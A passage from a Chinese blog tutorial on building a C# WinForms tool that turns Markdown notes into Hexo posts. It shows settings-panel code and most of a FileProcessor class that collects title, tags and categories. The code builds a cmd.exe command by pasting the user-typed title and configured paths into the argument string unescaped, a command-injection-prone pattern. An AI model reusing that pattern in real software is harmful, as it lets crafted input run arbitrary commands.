class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 路径无效</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>选文件路径是用<strong>folderDialog</strong>，类似于之前可视化文件选取所用到的<strong>OpenFileDialog</strong>。这里我们也是返回一个<strong>tableLayoutPanel</strong>到主程序，然后再在主程序中将其增加到对应的设计面板<strong>tableLayoutPanel</strong>中，最后主程序把设计面板加入<strong>Settings</strong>的<strong>TabPage</strong>即可。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Settings&quot;</span>:</span><br><span class="line">    Settings settings = <span class="keyword">new</span> Settings();     <span class="comment">//获取设置属性</span></span><br><span class="line">    settings.LoadSettings();</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    tableLayoutPanel.Controls.Add(settings.CreateLanguageSetting(), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    tableLayoutPanel.Controls.Add(settings.CreateHexoDirectorySetting(), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    newTab.Controls.Add(tableLayoutPanel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250127225711667.png"
                      class=""
                >

<h4 id="文件格式转换功能实现"><a href="#文件格式转换功能实现" class="headerlink" title="文件格式转换功能实现"></a>文件格式转换功能实现</h4><p>前面我们已经解决了获取输入文件路径以及输出目录的问题，然后我们就可以着手实现我们的核心功能，也就是图片文件转移与输出目标格式文件。这里我们还可以可视化实现hexo文章标签与类别的设置。以下是整个<strong>FileProcessor.cs</strong>的实现。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">FileProcessor</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Tag &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;    <span class="comment">// Hexo文章标签</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Title &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;  <span class="comment">// Hexo文章标题</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Category &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;   <span class="comment">// Hexo文章分类</span></span><br><span class="line">        <span class="keyword">private</span> FlowLayoutPanel tagsPanel;</span><br><span class="line">        <span class="keyword">private</span> Button addTagButton;</span><br><span class="line">        <span class="keyword">private</span> Button removeTagButton;</span><br><span class="line">        <span class="keyword">private</span> List&lt;TextBox&gt; tagsTextBoxes = <span class="keyword">new</span> List&lt;TextBox&gt;();</span><br><span class="line">        <span class="keyword">private</span> FlowLayoutPanel categoriesPanel;</span><br><span class="line">        <span class="keyword">private</span> Button addCategoryButton;</span><br><span class="line">        <span class="keyword">private</span> Button removeCategoryButton;</span><br><span class="line">        <span class="keyword">private</span> List&lt;TextBox&gt; categoriesTextBoxes = <span class="keyword">new</span> List&lt;TextBox&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> RichTextBox processInfoBox;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//渲染Process Markdown面板</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Control <span class="title">CreateProcessMarkdownPanel</span>(<span class="params"><span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建 TableLayoutPanel 用于布局</span></span><br><span class="line">            TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">            &#123;</span><br><span class="line">                RowCount = <span class="number">6</span>, <span class="comment">// 根据需要的行数调整</span></span><br><span class="line">                ColumnCount = <span class="number">2</span>,</span><br><span class="line">                Dock = DockStyle.Fill,</span><br><span class="line">                AutoSize = <span class="literal">true</span>,</span><br><span class="line">                Padding = <span class="keyword">new</span> Padding(<span class="number">20</span>)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>));</span><br><span class="line">            tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">80</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建文件路径标签</span></span><br><span class="line">            Label filePathLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Source File Path: &quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            Label filePathValueLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = filePath,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft,</span><br><span class="line">                Font = <span class="keyword">new</span> Font(<span class="string">&quot;Consolas&quot;</span>, <span class="number">10</span>),</span><br><span class="line">                AutoSize = <span class="literal">false</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 计算文本的宽度</span></span><br><span class="line">            SizeF textSize = TextRenderer.MeasureText(filePath, filePathValueLabel.Font);</span><br><span class="line">            filePathValueLabel.Width = (<span class="built_in">int</span>)textSize.Width + <span class="number">20</span>;  <span class="comment">// 20 是为了留一些额外的空间，可以根据需要调整</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建标题标签</span></span><br><span class="line">            Label titleLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Title&quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建标题输入框</span></span><br><span class="line">            TextBox titleTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">            &#123;</span><br><span class="line">                Multiline = <span class="literal">true</span>,</span><br><span class="line">                Width = <span class="number">300</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建标签输入框</span></span><br><span class="line">            Label tagsLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Tags&quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 FlowLayoutPanel 用来容纳多个输入框</span></span><br><span class="line">            tagsPanel = <span class="keyword">new</span> FlowLayoutPanel</span><br><span class="line">            &#123;</span><br><span class="line">                Dock = DockStyle.Top,</span><br><span class="line">                AutoSize = <span class="literal">true</span>,</span><br><span class="line">                FlowDirection = FlowDirection.LeftToRight,  <span class="comment">// 横向排列</span></span><br><span class="line">                WrapContents = <span class="literal">true</span>,  <span class="comment">// 容量满了之后自动换行</span></span><br><span class="line">                Padding = <span class="keyword">new</span> Padding(<span class="number">10</span>)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 创建加号按钮</span></span><br><span class="line">            addTagButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;+&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            addTagButton.Click += AddTagButton_Click;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建减号按钮</span></span><br><span class="line">            removeTagButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;-&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            removeTagButton.Click += RemoveTagButton_Click;</span><br><span class="line">            <span class="comment">// 添加初始的标签输入框</span></span><br><span class="line">            AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建分类输入框</span></span><br><span class="line">            Label categoryLabel = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Category&quot;</span>,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleLeft</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 FlowLayoutPanel 用来容纳多个输入框</span></span><br><span class="line">            categoriesPanel = <span class="keyword">new</span> FlowLayoutPanel</span><br><span class="line">            &#123;</span><br><span class="line">                Dock = DockStyle.Top,</span><br><span class="line">                AutoSize = <span class="literal">true</span>,</span><br><span class="line">                FlowDirection = FlowDirection.LeftToRight,  <span class="comment">// 横向排列</span></span><br><span class="line">                WrapContents = <span class="literal">true</span>,  <span class="comment">// 容量满了之后自动换行</span></span><br><span class="line">                Padding = <span class="keyword">new</span> Padding(<span class="number">10</span>)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 创建加号按钮</span></span><br><span class="line">            addCategoryButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;+&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            addCategoryButton.Click += AddCategoryButton_Click;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建减号按钮</span></span><br><span class="line">            removeCategoryButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;-&quot;</span>,</span><br><span class="line">                AutoSize = <span class="literal">true</span></span><br><span class="line">            &#125;;</span><br><span class="line">            removeCategoryButton.Click += RemoveCategoryButton_Click;</span><br><span class="line">            <span class="comment">// 添加初始的标签输入框</span></span><br><span class="line">            AddInputBox(categoriesPanel, categoriesTextBoxes, addCategoryButton, removeCategoryButton);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建确定按钮</span></span><br><span class="line">            Button confirmButton = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">&quot;Process&quot;</span>,</span><br><span class="line">                Width = <span class="number">100</span>,</span><br><span class="line">                Height = <span class="number">40</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 点击按钮时执行 ProcessMarkdownFile</span></span><br><span class="line">            confirmButton.Click += (sender, e) =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                confirmButton.Visible = <span class="literal">false</span>;  <span class="comment">// 隐藏确定按钮，防止用户多次点击</span></span><br><span class="line">                <span class="built_in">string</span> title = titleTextBox.Text;</span><br><span class="line">                List&lt;<span class="built_in">string</span>&gt; tags = GetTags();</span><br><span class="line">                List&lt;<span class="built_in">string</span>&gt; category = GetCategories();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 非空检测</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrWhiteSpace(title))</span><br><span class="line">                &#123;</span><br><span class="line">                    MessageBox.Show(<span class="string">&quot;Title cannot be empty.&quot;</span>, <span class="string">&quot;Input Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                    <span class="keyword">return</span>;  <span class="comment">// 直接退出，不继续执行后续代码</span></span><br><span class="line">                &#125;</span><br><span class="line">                ProcessMarkdownFile(title, tags, category, filePath);</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 Process 信息框</span></span><br><span class="line">            processInfoBox = <span class="keyword">new</span> RichTextBox</span><br><span class="line">            &#123;</span><br><span class="line">                Multiline = <span class="literal">true</span>,</span><br><span class="line">                Width = <span class="number">600</span>,</span><br><span class="line">                Height = <span class="number">200</span>,</span><br><span class="line">                ReadOnly = <span class="literal">true</span>,  <span class="comment">// 设置为只读</span></span><br><span class="line">                ScrollBars = RichTextBoxScrollBars.Vertical,  <span class="comment">// 启用滚动条</span></span><br><span class="line">                WordWrap = <span class="literal">true</span>,   <span class="comment">// 自动换行</span></span><br><span class="line">                Font = <span class="keyword">new</span> Font(<span class="string">&quot;Consolas&quot;</span>, <span class="number">12</span>)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将控件添加到 TableLayoutPanel</span></span><br><span class="line">            tableLayoutPanel.Controls.Add(filePathLabel, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(filePathValueLabel, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(titleLabel, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(titleTextBox, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(tagsLabel, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(tagsPanel, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(categoryLabel, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(categoriesPanel, <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(confirmButton, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(processInfoBox, <span class="number">1</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> tableLayoutPanel;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button addButton, Button removeButton</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建新的 TextBox 控件</span></span><br><span class="line">            TextBox newInputTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">            &#123;</span><br><span class="line">                Width = <span class="number">100</span>,  <span class="comment">// 设置适当的宽度</span></span><br><span class="line">                Margin = <span class="keyword">new</span> Padding(<span class="number">5</span>)  <span class="comment">// 设置间距</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将新的 TextBox 添加到列表和面板</span></span><br><span class="line">            textBoxesList.Add(newInputTextBox);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 先移除+-号按钮，之后再添加，确保在最后一个位置</span></span><br><span class="line">            <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">                inputPanel.Controls.Remove(removeButton);</span><br><span class="line">            inputPanel.Controls.Remove(addButton);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加新的输入框和按钮</span></span><br><span class="line">            inputPanel.Controls.Add(newInputTextBox);</span><br><span class="line">            inputPanel.Controls.Add(addButton);  <span class="comment">// 将加号按钮添加到 inputPanel 中</span></span><br><span class="line">            <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">                inputPanel.Controls.Add(removeButton);  <span class="comment">// 将减号按钮添加到 inputPanel 中</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button removeButton</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取列表中最后一个添加的 TextBox 和相应的按钮</span></span><br><span class="line">                TextBox lastInputTextBox = textBoxesList.Last();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 从 inputPanel 和 textBoxesList 中移除最后一个 TextBox 和按钮</span></span><br><span class="line">                <span class="keyword">if</span> (lastInputTextBox != <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    inputPanel.Controls.Remove(lastInputTextBox);</span><br><span class="line">                    textBoxesList.Remove(lastInputTextBox);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果只有一个标签输入框，则隐藏减号按钮</span></span><br><span class="line">            <span class="keyword">if</span> (textBoxesList.Count == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">                    inputPanel.Controls.Remove(removeButton);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            RemoveInputBox(tagsPanel, tagsTextBoxes, removeTagButton);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddCategoryButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddInputBox(categoriesPanel, categoriesTextBoxes, addCategoryButton, removeCategoryButton);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveCategoryButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            RemoveInputBox(categoriesPanel, categoriesTextBoxes, removeCategoryButton);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取用户输入的所有标签</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">GetTags</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; tags = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> textBox <span class="keyword">in</span> tagsTextBoxes)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrWhiteSpace(textBox.Text))</span><br><span class="line">                &#123;</span><br><span class="line">                    tags.Add(textBox.Text);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tags;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取用户输入的所有类型</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">GetCategories</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; categories = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> textBox <span class="keyword">in</span> categoriesTextBoxes)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrWhiteSpace(textBox.Text))</span><br><span class="line">                &#123;</span><br><span class="line">                    categories.Add(textBox.Text);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> categories;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 显示提示信息</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">AppendMessage</span>(<span class="params"><span class="built_in">string</span> message, Color color</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置不同颜色（可选）</span></span><br><span class="line">            processInfoBox.SelectionColor = color;  <span class="comment">// 设置文本颜色</span></span><br><span class="line">            processInfoBox.AppendText(message + Environment.NewLine);</span><br><span class="line">            processInfoBox.ScrollToCaret();  <span class="comment">// 确保显示滚动到文本底部</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理Markdown文件</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">ProcessMarkdownFile</span>(<span class="params"><span class="built_in">string</span> title, List&lt;<span class="built_in">string</span>&gt; tags, List&lt;<span class="built_in">string</span>&gt; category, <span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Settings settings = <span class="keyword">new</span> Settings();</span><br><span class="line">            settings.LoadSettings();</span><br><span class="line">            <span class="built_in">string</span> hexoDirectory = settings.HexoDirectory;</span><br><span class="line">            <span class="built_in">string</span> rootDirectory = hexoDirectory.Substring(<span class="number">0</span>, hexoDirectory.LastIndexOf(<span class="string">&quot;\\&quot;</span>));</span><br><span class="line">            <span class="built_in">string</span> postDirectory = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> hexoNewCmd = <span class="string">$&quot;hexo new \&quot;<span class="subst">&#123;title&#125;</span>\&quot;&quot;</span>;    <span class="comment">// 创建新文章命令</span></span><br><span class="line">            AppendMessage(<span class="string">$&quot;[*] executing command: <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>, Color.Black);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 使用 Process 执行命令</span></span><br><span class="line">                ProcessStartInfo processStartInfo = <span class="keyword">new</span> ProcessStartInfo</span><br><span class="line">                &#123;</span><br><span class="line">                    FileName = <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">                    Arguments = <span class="string">$&quot;/c <span class="subst">&#123;rootDirectory&#125;</span> &amp;&amp; cd <span class="subst">&#123;hexoDirectory&#125;</span> &amp;&amp; <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>,</span><br><span class="line">                    CreateNoWindow = <span class="literal">true</span>,</span><br><span class="line">                    UseShellExecute = <span class="literal">false</span>,</span><br><span class="line">                    RedirectStandardOutput = <span class="literal">true</span>,</span><br><span class="line">                    RedirectStandardError = <span class="literal">true</span>,</span><br><span class="line">                  </span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (Process process = Process.Start(processStartInfo))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">string</span> output = <span class="keyword">await</span> process.StandardOutput.ReadToEndAsync();</span><br><span class="line">                    <span class="built_in">string</span> error = <span class="keyword">await</span> process.StandardError.ReadToEndAsync();</span><br><span class="line">                    </span><br><span class="line">                    process.WaitForExit();</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (process.ExitCode != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        MessageBox.Show(<span class="string">$&quot;Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                        AppendMessage(<span class="string">$&quot;[-] Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (File.Exists(Path.Combine(postDirectory, title + <span class="string">&quot;.md&quot;</span>)))        <span class="comment">// 检查新文章是否创建成功</span></span><br><span class="line">                        AppendMessage(<span class="string">&quot;[+] successfully created new post!&quot;</span>,Color.Green);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                MessageBox.Show(<span class="string">$&quot;Error: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取生成的 Markdown 文件路径</span></span><br><span class="line">            <span class="built_in">string</span> targetMarkdownFilePath = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>, <span class="string">$&quot;<span class="subst">&#123;title&#125;</span>.md&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> targetMarkdownPictureDirectory = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>, <span class="string">$&quot;<span class="subst">&#123;title&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> fileContent = <span class="keyword">await</span> Task.Run(() =&gt; File.ReadAllText(filePath, Encoding.UTF8));     <span class="comment">// 异步读取 Markdown 文件内容</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 构建 YAML 前言部分</span></span><br><span class="line">            StringBuilder frontMatter = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">            frontMatter.AppendLine(<span class="string">$&quot;title: <span class="subst">&#123;title&#125;</span>&quot;</span>);</span><br><span class="line">            frontMatter.AppendLine(<span class="string">$&quot;date: <span class="subst">&#123;DateTime.Now:yyyy-MM-dd HH:mm:ss&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加 tags</span></span><br><span class="line">            <span class="keyword">if</span> (tags != <span class="literal">null</span> &amp;&amp; tags.Count &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                frontMatter.AppendLine(<span class="string">&quot;tags:&quot;</span>);</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="built_in">string</span> tag <span class="keyword">in</span> tags)</span><br><span class="line">                &#123;</span><br><span class="line">                    frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;tag&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加 categories</span></span><br><span class="line">            <span class="keyword">if</span> (category != <span class="literal">null</span> &amp;&amp; category.Count &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                frontMatter.AppendLine(<span class="string">&quot;categories:&quot;</span>);</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="built_in">string</span> cat <span class="keyword">in</span> category)</span><br><span class="line">                &#123;</span><br><span class="line">                    frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;cat&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 正则表达式：查找所有的图片引用</span></span><br><span class="line">            <span class="built_in">string</span> imagePattern = <span class="string">@&quot;!\[([^\]]+)\]\(([^)]+)\)&quot;</span>;</span><br><span class="line">            MatchCollection matches = Regex.Matches(fileContent, imagePattern);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (Match match <span class="keyword">in</span> matches)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span> altText = match.Groups[<span class="number">1</span>].Value;  <span class="comment">// 图片描述</span></span><br><span class="line">                <span class="built_in">string</span> imgPath = match.Groups[<span class="number">2</span>].Value;  <span class="comment">// 图片路径</span></span><br><span class="line"></span><br><span class="line">                imgPath = Path.GetFullPath(Path.Combine(Path.GetDirectoryName(filePath), imgPath));      <span class="comment">// 处理相对路径</span></span><br><span class="line">                imgPath = imgPath.Replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);  <span class="comment">// 确保路径使用正斜杠</span></span><br><span class="line">                <span class="comment">// 提取图片文件名</span></span><br><span class="line">                <span class="built_in">string</span> imgFilename = Path.GetFileName(imgPath);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 检查图片文件是否存在</span></span><br><span class="line">                <span class="keyword">if</span> (File.Exists(imgPath))</span><br><span class="line">                &#123;</span><br><span 